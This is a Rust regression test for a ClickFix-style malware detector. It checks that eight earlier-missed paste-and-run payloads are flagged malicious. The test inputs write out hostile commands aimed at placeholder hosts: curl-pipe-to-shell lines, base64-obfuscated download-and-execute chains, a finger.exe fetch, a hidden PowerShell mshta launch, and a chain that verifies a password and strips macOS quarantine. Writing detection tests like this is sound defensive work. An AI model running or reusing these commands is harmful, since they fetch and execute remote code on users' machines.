use clickfix_detect::{Detector, DetectorInput, PrefilterDecision, Verdict};

struct RegressionCase {
    id: &'static str,
    input: DetectorInput,
    required_rule: &'static str,
    expected_url: &'static str,
}

fn cases() -> Vec<RegressionCase> {
    vec![
        RegressionCase {
            id: "A21",
            input: DetectorInput::bash_script(
                "dscl . -authonly analysis safe-password \
                 && curl -fsSL 'https://stage.invalid/A21/payload' -o /tmp/a21 \
                 && sudo xattr -c /tmp/a21 \
                 && sudo chmod +x /tmp/a21 \
                 && /tmp/a21",
            ),
            required_rule: "chain.download-write-execute",
            expected_url: "https://stage.invalid/A21/payload",
        },
        RegressionCase {
            id: "A23",
            input: DetectorInput::raw_command("finger.exe stage@a23.stage.invalid"),
            required_rule: "network.finger-download",
            expected_url: "finger://a23.stage.invalid/stage",
        },
        RegressionCase {
            id: "A32",
            input: DetectorInput::bash_script(
                "curl -fsSL 'https://stage.invalid/A32/loader' | zsh",
            ),
            required_rule: "chain.download-execute",
            expected_url: "https://stage.invalid/A32/loader",
        },
        RegressionCase {
            id: "A33",
            input: DetectorInput::bash_script(
                "echo 'Y3VybCAtZnNTTCAnaHR0cHM6Ly9zdGFnZS5pbnZhbGlkL0EzMy9sb2FkZXInIHwgenNo' | base64 -d | bash",
            ),
            required_rule: "shell.encoded-remote-command",
            expected_url: "https://stage.invalid/A33/loader",
        },
        RegressionCase {
            id: "A34",
            input: DetectorInput::bash_script(
                "curl -fsSL 'https://stage.invalid/A34/stager.gz' | gzip -dc | zsh",
            ),
            required_rule: "chain.download-execute",
            expected_url: "https://stage.invalid/A34/stager.gz",
        },
        RegressionCase {
            id: "A35",
            input: DetectorInput::bash_script(
                "curl -fsSL 'https://stage.invalid/A35/curl/defanged' | zsh",
            ),
            required_rule: "chain.download-execute",
            expected_url: "https://stage.invalid/A35/curl/defanged",
        },
        RegressionCase {
            id: "A39",
            input: DetectorInput::bash_script(
                "curl -kfsSL $(echo 'aHR0cHM6Ly9zdGFnZS5pbnZhbGlkL0EzOS9sb2FkZXI=' | base64 -D) | zsh",
            ),
            required_rule: "chain.download-execute",
            expected_url: "https://stage.invalid/A39/loader",
        },
        RegressionCase {
            id: "A40",
            input: DetectorInput::raw_command(
                "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass \
                 -Command \"& ('ms'+'hta') 'https://stage.invalid/A40/fix-error'\"",
            ),
            required_rule: "behavior.remote-execution-proxy",
            expected_url: "https://stage.invalid/A40/fix-error",
        },
    ]
}

#[test]
fn previously_missed_payloads_are_malicious_and_explainable() {
    for case in cases() {
        assert_eq!(
            Detector::prefilter(&case.input.content).decision,
            PrefilterDecision::Candidate,
            "{} was skipped by the prefilter",
            case.id
        );
        let report = Detector::default()
            .analyze(case.input)
            .unwrap_or_else(|error| panic!("{} failed analysis: {error}", case.id));

        assert_eq!(
            report.verdict,
            Verdict::Malicious,
            "{} risk={} findings={:?}",
            case.id,
            report.risk.score,
            report
                .findings
                .iter()
                .map(|finding| finding.rule_id.as_str())
                .collect::<Vec<_>>()
        );
        assert!(
            report
                .findings
                .iter()
                .any(|finding| finding.rule_id == case.required_rule),
            "{} missing {}",
            case.id,
            case.required_rule
        );
        assert!(
            report
                .network_urls
                .iter()
                .any(|url| url == case.expected_url),
            "{} missing decoded/derived URL {}: {:?}",
            case.id,
            case.expected_url,
            report.network_urls
        );
        if case.id == "A21" {
            assert!(report
                .findings
                .iter()
                .any(|finding| finding.rule_id == "behavior.credential-access"));
        }
    }
}
